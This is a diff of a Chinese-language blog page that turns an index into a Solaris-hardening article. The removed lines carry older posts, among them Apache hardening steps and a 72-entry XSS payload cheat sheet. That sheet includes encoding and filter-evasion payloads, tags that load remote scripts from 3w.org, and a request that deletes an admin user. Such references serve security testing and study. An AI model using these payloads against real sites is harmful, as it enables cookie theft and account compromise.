@@ -3,17 +3,36 @@
 <head>
   <meta charset="utf-8">
   
-  <title>oneplusone&#39;s blog</title>
+  <title>教你如何配置安全的SOLARIS系统 | oneplusone&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description">
-<meta property="og:type" content="website">
-<meta property="og:title" content="oneplusone's blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="1.    帐号和口令安全策略
+1.1更改口令文件、影像文件、组文件的权限  
+/etc/passwd 必须所有用户都可读，root用户可写 –rw-r--r--
+/etc/shadow 只有root可读 –r-------- 
+/etc/group 必须所有用户都可读，root用户可写 –rw-r--r--
+
+1.2修改不必要的系统帐号移去或者锁定那些系统帐号，比如sys、uucp、nuucp、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="教你如何配置安全的SOLARIS系统">
+<meta property="og:url" content="http://yoursite.com/2016/01/05/solaris/index.html">
 <meta property="og:site_name" content="oneplusone's blog">
-<meta property="og:description">
+<meta property="og:description" content="1.    帐号和口令安全策略
+1.1更改口令文件、影像文件、组文件的权限  
+/etc/passwd 必须所有用户都可读，root用户可写 –rw-r--r--
+/etc/shadow 只有root可读 –r-------- 
+/etc/group 必须所有用户都可读，root用户可写 –rw-r--r--
+
+1.2修改不必要的系统帐号移去或者锁定那些系统帐号，比如sys、uucp、nuucp、">
+<meta property="og:updated_time" content="2016-01-05T11:02:37.009Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="oneplusone's blog">
-<meta name="twitter:description">
+<meta name="twitter:title" content="教你如何配置安全的SOLARIS系统">
+<meta name="twitter:description" content="1.    帐号和口令安全策略
+1.1更改口令文件、影像文件、组文件的权限  
+/etc/passwd 必须所有用户都可读，root用户可写 –rw-r--r--
+/etc/shadow 只有root可读 –r-------- 
+/etc/group 必须所有用户都可读，root用户可写 –rw-r--r--
+
+1.2修改不必要的系统帐号移去或者锁定那些系统帐号，比如sys、uucp、nuucp、">
   
     <link rel="alternative" href="/atom.xml" title="oneplusone&#39;s blog" type="application/atom+xml">
   
@@ -63,9 +82,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-solaris" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-solaris" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2016/01/05/solaris/" class="article-date">
   <time datetime="2016-01-05T08:45:33.000Z" itemprop="datePublished">2016-01-05</time>
@@ -78,8 +95,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/01/05/solaris/">教你如何配置安全的SOLARIS系统</a>
+    <h1 class="article-title" itemprop="name">
+      教你如何配置安全的SOLARIS系统
     </h1>
   
 
@@ -294,620 +311,20 @@ wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-curl" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/01/04/curl/" class="article-date">
-  <time datetime="2016-01-04T08:27:17.000Z" itemprop="datePublished">2016-01-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/01/04/curl/">使用curl进行文件上传</a>
-    </h1>
+    <a href="/2016/01/04/curl/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">使用curl进行文件上传</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>最近测试文件上传功能，手工上传太麻烦，就想有没有比较简单的方法，<br>发现curl竟然提供了通过post上传文件的功能</p>
-<h2 id="u201Ccurl_-d_URL_u201D"><a href="#u201Ccurl_-d_URL_u201D" class="headerlink" title="“curl -d URL”"></a>“curl -d URL” </h2><p>可以向URL发送post请求参数</p>
-<p>-F 功能则可以post请求上传文件<br>使用curl <wbr>通过post <wbr>向HTTP上传文件直接贴代码 </p>
-<h2 id="curl_-F_file_3D@1-txt_submit_3DSubmit_URL"><a href="#curl_-F_file_3D@1-txt_submit_3DSubmit_URL" class="headerlink" title="curl -F file=@1.txt submit=Submit URL"></a>curl -F file=@1.txt submit=Submit URL</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/curl/" data-id="cij1b1e6u0004wsfwffehntdk" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
   
 </article>
 
-
-  
-    <article id="post-cmdtime" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/01/04/cmdtime/" class="article-date">
-  <time datetime="2016-01-04T08:25:40.000Z" itemprop="datePublished">2016-01-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/01/04/cmdtime/">批处理脚本解决0点问题</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>最近用批处理按照日期和小时生成文件夹进行每小时的工作统计，遇到过23点后文件夹无法生成。经过网上查找资料 原来</p>
-<p>是10点之前的小时数为单个，在过完23点后无法生成00。解决过程如下:<br>批处理获取当前时间对10点之前获取小时进行补0，<br>set hh=%time:~0,2%<br>if /i %hh% LSS 10 (set hh=0%time:~1,1%)<br>set AFile=Web_%date:~5,2%%date:~8,2%%hh%<br>rd %AFile% 2&gt;nul<br>mkdir %AFile%<br>生成文件夹10点之前的即为 061809</p>
-<p>AFile即为要生成的时间</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/01/04/cmdtime/" data-id="cij1b1e6w0005wsfwrqr0mzvi" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-apache" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/31/apache/" class="article-date">
-  <time datetime="2015-12-31T02:35:31.000Z" itemprop="datePublished">2015-12-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/31/apache/">apache安全加固</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="u4E00-_u8D26_u53F7_u8BBE_u7F6E"><a href="#u4E00-_u8D26_u53F7_u8BBE_u7F6E" class="headerlink" title="一.账号设置"></a>一.账号设置</h1><p>以专门的用户帐号和组运行 Apache。</p>
-<p>1、根据需要为 Apache 创建用户、组</p>
-<p>2、参考配置操作 如果没有设置用户和组，则新建用户，并在 Apache 配置文件中指定</p>
-<p>(1) 创建 apache 组：groupadd apache</p>
-<p>(2) 创建 apache 用户并加入 apache 组：useradd apache –g apache</p>
-<p>(3) 将下面两行加入 Apache 配置文件 httpd.conf 中</p>
-<p>User apache</p>
-<p>Group apache</p>
-<p>3、检查 httpd.conf 配置文件。 检查是否使用非专用账户（如 root）运行 apache</p>
-<p>默认一般符合要求，linux下默认apache或者nobody用户，Unix默认为daemon用户</p>
-<h1 id="u4E8C-_u6388_u6743_u8BBE_u7F6E"><a href="#u4E8C-_u6388_u6743_u8BBE_u7F6E" class="headerlink" title="二.授权设置"></a>二.授权设置</h1><p>严格控制Apache主目录的访问权限，非超级用户不能修改该目录中的内容</p>
-<p>1、Apache 的 主目录对应 于 Apache Server</p>
-<p>配置文件 httpd.conf 的</p>
-<p>Server Root控制项中，</p>
-<p>应为：</p>
-<p>Server Root /usr/local/apache”</p>
-<p>2、判定条件</p>
-<p>非超级用户不能修改该目录中的内容</p>
-<p>3、检测操作</p>
-<p>尝试修改，看是否能修改</p>
-<p>4、一般为/etc/httpd目录，默认情况下属主为root:root，其它用户不能修改文件，默认一般符合要求</p>
-<p>严格设置配置文件和日志文件的权限，防止未授权访问</p>
-<p>1、chmod 600 /etc/httpd/conf/httpd.conf”设置配置文件为属主可读写，其他用户无权限。</p>
-<p>2、使用命令”chmod 644 /var/log/httpd/*.log”设置日志文件为属主可读写，其他用户只读权限。</p>
-<p>3、/etc/httpd/conf/httpd.conf默认权限是644，可根据需要修改权限为600。</p>
-<p>4、/var/log/httpd/*.log默认权限为644，默认一般符合要求。</p>
-<h1 id="u4E09-_u65E5_u5FD7_u8BBE_u7F6E"><a href="#u4E09-_u65E5_u5FD7_u8BBE_u7F6E" class="headerlink" title="三.日志设置"></a>三.日志设置</h1><p>设备应配置日志功能，对运行错误、用户访问等进行记录，记录</p>
-<p>内容包括时间，用户使用的 IP 地址等内容。</p>
-<p>1、编辑 httpd.conf 配置文件，设置日志记录文件、记录内容、记录 格式。</p>
-<p>其中，错误日志：</p>
-<p>LogLevel notice #日志的级别</p>
-<p>ErrorLog /…/logs/error_log #日志的保存位置（错误日志）</p>
-<p>访问日志：</p>
-<p>LogFormat %h %l %u %t \”%r\” %&gt;s %b “%{Accept}i\”%{Referer}i\” \”%{User-Agent}i\””</p>
-<p>combined</p>
-<p>CustomLog /…/logs/access_log combined （访问日志）</p>
-<p>ErrorLog 指令设置错误日志文件名和位置。错误日志是最重要的 日志文件，</p>
-<p>Apache httpd 将在这个文件中存放诊断信息和处理请 求中出现的错误。</p>
-<p>若要将错误日志送到 Syslog，则设置： ErrorLog syslog。</p>
-<p>CustomLog 指令指定了保存日志文件的具体位置以及日志的格式。访问日志中会记录服务器所处理的所有请求。</p>
-<p>LogFormat 设置日志格式，建议设置为 combined 格式。</p>
-<p>LogLevel 用于调整记录在错误日志中的信息的详细程度，建议设置为notice。</p>
-<p>日志的级别，默认是warn，notice级别比较详细，在实际中由于日志会占用大量硬盘空间，一般没有设置</p>
-<h1 id="u56DB-_u7981_u6B62_u8BBF_u95EE_u5916_u90E8_u6587_u4EF6"><a href="#u56DB-_u7981_u6B62_u8BBF_u95EE_u5916_u90E8_u6587_u4EF6" class="headerlink" title="四.禁止访问外部文件"></a>四.禁止访问外部文件</h1><p>禁止 Apache 访问 Web 目录之外的任何文件。</p>
-<p>1、参考配置操作</p>
-<p>编辑 httpd.conf 配置文件，</p>
-<p>Order Deny,Allow</p>
-<p>Deny from all</p>
-<p>2、设置可访问目录，</p>
-<p>Order Allow,Deny</p>
-<p>Allow from all</p>
-<p>其中/web 为网站根目录</p>
-<p>3、默认配置是</p>
-<p>Options FollowSymLinks</p>
-<p>AllowOverride None</p>
-<p>一般可根据需要设置</p>
-<h1 id="u4E94-_u76EE_u5F55_u5217_u51FA"><a href="#u4E94-_u76EE_u5F55_u5217_u51FA" class="headerlink" title="五.目录列出"></a>五.目录列出</h1><p>禁止 Apache 列表显示文件<br>编辑 httpd.conf 配置文件。</p>
-<p>Options Indexes FollowSymLinks #删掉</p>
-<p>Indexes</p>
-<p>AllowOverride None</p>
-<p>Order allow,deny</p>
-<p>Allow from all</p>
-<p>将Options Indexes FollowSymLinks 中的 Indexes 去掉，就可以禁 止 Apache 显示该目录结构。</p>
-<p>Indexes 的作用就是当该目录下没 有 index.html 文件时，就显示目录结构。</p>
-<p>2、重新启动 Apache 服务</p>
-<p>3、可以设置 /etc/httpd/httpd.conf 段中删除Options的Indexes设置 一般可根据需要设置</p>
-<h1 id="u516D-_u9519_u8BEF_u9875_u9762_u91CD_u5B9A_u5411"><a href="#u516D-_u9519_u8BEF_u9875_u9762_u91CD_u5B9A_u5411" class="headerlink" title="六.错误页面重定向"></a>六.错误页面重定向</h1><p>Apache 错误页面重定向</p>
-<p>1、修改 httpd.conf 配置文件：</p>
-<p>ErrorDocument 400 /custom400.html</p>
-<p>ErrorDocument 401 /custom401.html</p>
-<p>ErrorDocument 403 /custom403.html</p>
-<p>ErrorDocument 404 /custom404.html</p>
-<p>ErrorDocument 405 /custom405.html</p>
-<p>ErrorDocument 500 /custom500.html Customxxx.html 为要设置的错误页面。</p>
-<p>2、重新启动 Apache 服务</p>
-<p>3、此项需要应用系统设有错误页面，或者不在httpd中设置完全由业务逻辑实现，可不做</p>
-<h1 id="u4E03-_u62D2_u7EDD_u670D_u52A1_u9632_u8303"><a href="#u4E03-_u62D2_u7EDD_u670D_u52A1_u9632_u8303" class="headerlink" title="七.拒绝服务防范"></a>七.拒绝服务防范</h1><p>根据业务需要，合理设置 session 时间，防止拒绝服务攻击<br>1、编辑 httpd.conf 配置文件，</p>
-<p>Timeout 10 #客户端与服务器端建立连接前的时间间隔</p>
-<p>KeepAlive On<br>KeepAliveTimeout 15 #限制每个 session 的保持时间是 15 秒 注：此处为一建议值，具体的设定需要根据现实情况。<br>2、重新启动 Apache 服务</p>
-<p>3、默认Timeout 120 KeepAlive Off，KeepAliveTimeout 15，该项设置涉及性能调整，一般不做。</p>
-<h1 id="u516B-_u9690_u85CF_Apache__u7684_u7248_u672C_u53F7"><a href="#u516B-_u9690_u85CF_Apache__u7684_u7248_u672C_u53F7" class="headerlink" title="八.隐藏 Apache 的版本号"></a>八.隐藏 Apache 的版本号</h1><p>隐藏 Apache 的版本号及其它敏感信息。</p>
-<p>1、配置操作</p>
-<p>修改 httpd.conf 配置文件： ServerSignature Off ServerTokens Prod</p>
-<p>2、默认是 ServerSignature On，ServerTokens OS，可以设置</p>
-<h1 id="u4E5D-_u5173_u95ED_TRACE"><a href="#u4E5D-_u5173_u95ED_TRACE" class="headerlink" title="九.关闭 TRACE"></a>九.关闭 TRACE</h1><p>关闭 TRACE，防止 TRACE 方法被访问者恶意利用</p>
-<p>1、 配置修改vim /etc/httpd/conf/httpd.conf</p>
-<p>添加 “TraceEnable Off”</p>
-<p>注：适用于 Apache 2.0 以上版本</p>
-<p>2、默认没有该项设置，可以做。</p>
-<h1 id="u5341-_u7981_u7528_CGI"><a href="#u5341-_u7981_u7528_CGI" class="headerlink" title="十.禁用 CGI"></a>十.禁用 CGI</h1><p>如果服务器上不需要运行 CGI 程序，建议禁用 CGI</p>
-<p>1、 修改配置vim /etc/httpd/conf/httpd.conf</p>
-<p>把 cgi-bin 目录的配置和模块都注释掉</p>
-<p>#LoadModule cgi_module modules/mod_cgi.so</p>
-<p>#ScriptAlias /cgi-bin/ “/var/www/cgi-bin/”</p>
-<p>#</p>
-<p>#AllowOverride None</p>
-<p>#Options None</p>
-<p>#Order allow,deny</p>
-<p>#Allow from all</p>
-<p>2、 根据需要设置，如果没有CGI程序，可以关闭</p>
-<h1 id="u5341_u4E00-_u76D1_u542C_u5730_u5740_u7ED1_u5B9A"><a href="#u5341_u4E00-_u76D1_u542C_u5730_u5740_u7ED1_u5B9A" class="headerlink" title="十一.监听地址绑定"></a>十一.监听地址绑定</h1><p>服务器有多个 IP 地址时，只监听提供服务的 IP 地址</p>
-<p>1、 修改配置vim /etc/httpd/conf/httpd.con</p>
-<p>修改</p>
-<p>Listen x.x.x.x:80</p>
-<p>2、检测操作</p>
-<p>使用命令”cat /etc/httpd/conf/httpd.conf|grep Listen”查看是否 绑定 IP 地址</p>
-<p>3、默认设置是Listen 80监听所有地址，如果服务器只有一个IP地址可不做该项设置，如果有多个IP可以按照需要设。</p>
-<h1 id="u5341_u4E8C-_u5220_u9664_u7F3A_u7701_u5B89_u88C5_u7684_u65E0_u7528_u6587_u4EF6"><a href="#u5341_u4E8C-_u5220_u9664_u7F3A_u7701_u5B89_u88C5_u7684_u65E0_u7528_u6587_u4EF6" class="headerlink" title="十二.删除缺省安装的无用文件"></a>十二.删除缺省安装的无用文件</h1><p>删除缺省安装的无用文件。</p>
-<p>1、参考配置操作删除缺省 HTML 文件：</p>
-<p>#rm -rf /usr/local/apache2/htdocs/*</p>
-<p>删除缺省的 CGI 脚本：</p>
-<p>#rm –rf /usr/local/apache2/cgi-bin/*</p>
-<p>删除 Apache 说明文件：</p>
-<p>#rm –rf /usr/local/apache2/manual</p>
-<p>删除源代码文件：</p>
-<p>#rm -rf /path/to/httpd-2.2.4* 根据安装步骤不同和版本不同，某些目录或文件可能不存在或位置不同。</p>
-<p>2、可根据实际情况删除，一般是 /var/www/html /var/www/cgi-bin 默认就是空的</p>
-<h1 id="u5341_u4E09-_u7981_u7528_u975E_u6CD5_HTTP__u65B9_u6CD5"><a href="#u5341_u4E09-_u7981_u7528_u975E_u6CD5_HTTP__u65B9_u6CD5" class="headerlink" title="十三.禁用非法 HTTP 方法"></a>十三.禁用非法 HTTP 方法</h1><p>禁用PUT、DELETE等危险的HTTP 方法；</p>
-<p>1、 编辑 httpd.conf 文件。</p>
-<p>只允许 get、post 方法</p>
-<p>Deny from all</p>
-<p>2、检测操作</p>
-<p>查看 httpd.conf 文件，</p>
-<p>检查如下内容，是否只允许 get、post</p>
-<p>方法</p>
-<p>Deny from all</p>
-<p>3、根据需要可设置，如果没有不需要用到put delete HTTP 方法的话，</p>
-<p>加在/etc/httpd/conf/httpd.conf的段中。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/31/apache/" data-id="cij1b1e6z0006wsfwe3oqyaw5" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/25/hello-world/" class="article-date">
-  <time datetime="2015-12-25T08:56:16.542Z" itemprop="datePublished">2015-12-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/25/hello-world/">欢迎来到博客</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>欢迎来到oneplusone的博客<br>好好努力，加油哦！少年！记得好好整理博客！<br>写博客一是为了给自己以前的工作做一个总结;<br>二是告诫自己忽忘初心，静下心来，安安静静的写点东西;<br>三是给未来的自己留下点值得回忆的岁月;<br>若有不当之处，定当改过！</p>
-<blockquote>
-<pre><code>写给自己
-</code></pre></blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2015/12/25/hello-world/" data-id="cij1b1e6q0003wsfwril53vjx" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/12/25/XSS/" class="article-date">
-  <time datetime="2015-12-25T08:04:32.000Z" itemprop="datePublished">2015-12-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/25/XSS/">XSS跨站脚本攻击汇总</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>  XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网<br>页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执<br>行，从而达到攻击者的目的. 比如获取用户的Cookie，导航到恶意网站,携带木马等!</p>
-</blockquote>
-<pre><code>                            XSS跨站脚本攻击汇总
-(1)普通的XSS JavaScript注入
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
-
-(2)IMG标签XSS使用JavaScript命令
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
-
-(3)IMG标签无分号无引号
-&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
-
-(4)IMG标签大小写不敏感
-&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;
-
-(5)HTML编码(必须有分号)
-&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
-
-(6)修正缺陷IMG标签
-&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
-
-(7)formCharCode标签(计算器)
-&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
-
-(8)UTF-8的Unicode编码(计算器)
-&lt;IMG SRC=jav..省略..S&apos;)&gt;
-
-(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
-&lt;IMG SRC=jav..省略..S&apos;)&gt;
-
-(10)十六进制编码也是没有分号(计算器)
-&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
-
-(11)嵌入式标签,将Javascript分开
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(12)嵌入式编码标签,将Javascript分开
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(13)嵌入式换行符
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(14)嵌入式回车
-&lt;IMG SRC=&quot;jav ascript:alert(‘XSS’);&quot;&gt;
-
-(15)嵌入式多行注入JavaScript,这是XSS极端的例子
-&lt;IMG SRC=&quot;javascript:alert(‘XSS‘)&quot;&gt;
-
-(16)解决限制字符(要求同页面)
-&lt;script&gt;z=’document.’&lt;/script&gt;
-&lt;script&gt;z=z+’write(&quot;‘&lt;/script&gt;
-&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;
-&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;
-&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;
-&lt;script&gt;z=z+’w.shell’&lt;/script&gt;
-&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;
-&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;
-&lt;script&gt;z=z+’ript&gt;&quot;)’&lt;/script&gt;
-&lt;script&gt;eval_r(z)&lt;/script&gt;
-
-(17)空字符
-perl -e ‘print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;’ &gt; out
-
-(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
-perl -e ‘print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;’ &gt; out
-
-(19)Spaces和meta前的IMG标签
-&lt;IMG SRC=&quot;   javascript:alert(‘XSS’);&quot;&gt;
-
-(20)Non-alpha-non-digit XSS
-&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(21)Non-alpha-non-digit XSS to 2
-&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
-
-(22)Non-alpha-non-digit XSS to 3
-&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(23)双开括号
-&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
-
-(24)无结束脚本标记(仅火狐等浏览器)
-&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;
-
-(25)无结束脚本标记2
-&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;
-
-(26)半开的HTML/JavaScript XSS
-&lt;IMG SRC=&quot;javascript:alert(‘XSS’)&quot;
-
-(27)双开角括号
-&lt;iframe src=http://3w.org/XSS.html &lt;
-
-(28)无单引号 双引号 分号
-&lt;SCRIPT&gt;a=/XSS/
-alert(a.source)&lt;/SCRIPT&gt;
-
-(29)换码过滤的JavaScript
-\&quot;;alert(‘XSS’);//
-
-(30)结束Title标签
-&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;
-
-(31)Input Image
-&lt;INPUT SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(32)BODY Image
-&lt;BODY BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(33)BODY标签
-&lt;BODY(‘XSS’)&gt;
-
-(34)IMG Dynsrc
-&lt;IMG DYNSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(35)IMG Lowsrc
-&lt;IMG LOWSRC=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(36)BGSOUND
-&lt;BGSOUND SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(37)STYLE sheet
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(‘XSS’);&quot;&gt;
-
-(38)远程样式表
-&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;
-
-(39)List-style-image(列表式)
-&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(‘XSS’)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
-
-(40)IMG VBscript
-&lt;IMG SRC=’vbscript:msgbox(&quot;XSS&quot;)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
-
-(41)META链接url
-&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(‘XSS’);&quot;&gt;
-
-(42)Iframe
-&lt;IFRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/IFRAME&gt;
-
-(43)Frame
-&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(‘XSS’);&quot;&gt;&lt;/FRAMESET&gt;
-
-(44)Table
-&lt;TABLE BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(45)TD
-&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(‘XSS’)&quot;&gt;
-
-(46)DIV background-image
-&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
-
-(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)
-&lt;DIV STYLE=&quot;background-image: none)&quot;&gt;
-
-(48)DIV expression
-&lt;DIV STYLE=&quot;width: expression_r(alert(‘XSS’));&quot;&gt;
-
-(49)STYLE属性分拆表达
-&lt;IMG STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
-
-(50)匿名STYLE(组成:开角号和一个字母开头)
-&lt;XSS STYLE=&quot;xss:expression_r(alert(‘XSS’))&quot;&gt;
-
-(51)STYLE background-image
-&lt;STYLE&gt;.XSS{background-image:none&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
-
-(52)IMG STYLE方式
-exppression(alert(&quot;XSS&quot;))’&gt;
-
-(53)STYLE background
-&lt;STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(‘XSS’)&quot;)}&lt;/STYLE&gt;
-
-(54)BASE
-&lt;BASE HREF=&quot;javascript:alert(‘XSS’);//&quot;&gt;
-
-(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
-&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;
-
-(56)在flash中使用ActionScrpt可以混进你XSS的代码
-a=&quot;get&quot;;
-b=&quot;URL(\&quot;&quot;;
-c=&quot;javascript:&quot;;
-d=&quot;alert(‘XSS’);\&quot;)&quot;;
-eval_r(a+b+c+d);
-
-(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
-&lt;HTML xmlns:xss&gt;
-&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;
-&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
-&lt;/HTML&gt;
-
-(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
-&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;
-
-(59)IMG嵌入式命令,可执行任意命令
-&lt;IMG SRC=&quot;http://www.XXX.com/a.php?a=b&quot;&gt;
-
-(60)IMG嵌入式命令(a.jpg在同服务器)
-Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser
-
-(61)绕符号过滤
-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(62)
-&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(63)
-&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(64)
-&lt;SCRIPT &quot;a=’&gt;’&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(65)
-&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(66)
-&lt;SCRIPT a=&quot;&gt;’&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(67)
-&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-
-(68)URL绕行
-&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;
-
-(69)URL编码
-&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;
-
-(70)IP十进制
-&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;
-
-(71)IP十六进制
-&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;
-
-(72)IP八进制
-&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;
